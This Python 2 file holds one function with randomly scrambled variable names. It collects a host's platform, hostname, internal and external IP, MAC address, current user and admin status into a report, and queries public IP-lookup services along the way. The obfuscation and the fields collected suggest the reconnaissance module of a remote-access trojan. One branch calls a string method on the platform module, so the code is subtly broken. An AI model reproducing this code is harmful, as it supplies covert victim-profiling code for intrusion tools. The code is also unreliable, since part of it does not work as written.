# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp(plat_type):
    xuJglnGHeqMqcRKeEeUkcfdAjEhPwxPy = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    HhBhooNaLdBaUMtdSHtERdmjPbpJEwBI = getpass.getuser()
    fkuRUnTZQBBcyhuiXjaTqrqWNnCBoftq    = socket.gethostname()
    RKumwtlEPUidJqNudDwgyffUxdbsspQs        = socket.getfqdn()
    yAGloBPIphHuHxoqaYhkRSPbxCCiWFZp = socket.gethostbyname(fkuRUnTZQBBcyhuiXjaTqrqWNnCBoftq)
    hslwygYEGqcWKWfoqxgpSRWNoLgmRcpz     = uuid.getnode()
    JRhjybcSeCohnjaTFtxyYhJrUhCyeNmi         = ':'.join(("%012X" % hslwygYEGqcWKWfoqxgpSRWNoLgmRcpz)[hscswvelsmekdrdqbSsXHYBuqgXbSmcs:hscswvelsmekdrdqbSsXHYBuqgXbSmcs+2] for hscswvelsmekdrdqbSsXHYBuqgXbSmcs in range(0, 12, 2))
    YILvnuhlFtuEdRBwJPcrGvwPmzXPKGip = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    DtZEeGcqTIYkXSmBzSLPbzeVBWnIXNWH = ''
    for DupvyQQFsTNzzMdqkTLlsfNBAjsKJLoI in YILvnuhlFtuEdRBwJPcrGvwPmzXPKGip:
        try:
            DtZEeGcqTIYkXSmBzSLPbzeVBWnIXNWH = urllib.urlopen('http://'+DupvyQQFsTNzzMdqkTLlsfNBAjsKJLoI).read().rstrip()
        except IOError:
            pass
        if DtZEeGcqTIYkXSmBzSLPbzeVBWnIXNWH and (6 < len(DtZEeGcqTIYkXSmBzSLPbzeVBWnIXNWH) < 16):
            break
    KeQJaDQuHiqQBOjtyKAXwkuneiUfAdIu = False
    if plat_type.startswith('win'):
        KeQJaDQuHiqQBOjtyKAXwkuneiUfAdIu = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        KeQJaDQuHiqQBOjtyKAXwkuneiUfAdIu = os.getuid() == 0
    evljwLNlpsrlRmZvBcjSKJMCvCPjytrV = 'Yes' if KeQJaDQuHiqQBOjtyKAXwkuneiUfAdIu else 'No'
    ZKnRpBuXBwhKJCRBTNbgJFeEDjQtUIKL = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(xuJglnGHeqMqcRKeEeUkcfdAjEhPwxPy, processor, architecture,
    fkuRUnTZQBBcyhuiXjaTqrqWNnCBoftq, RKumwtlEPUidJqNudDwgyffUxdbsspQs, yAGloBPIphHuHxoqaYhkRSPbxCCiWFZp, DtZEeGcqTIYkXSmBzSLPbzeVBWnIXNWH, JRhjybcSeCohnjaTFtxyYhJrUhCyeNmi, HhBhooNaLdBaUMtdSHtERdmjPbpJEwBI, evljwLNlpsrlRmZvBcjSKJMCvCPjytrV)
    return ZKnRpBuXBwhKJCRBTNbgJFeEDjQtUIKL
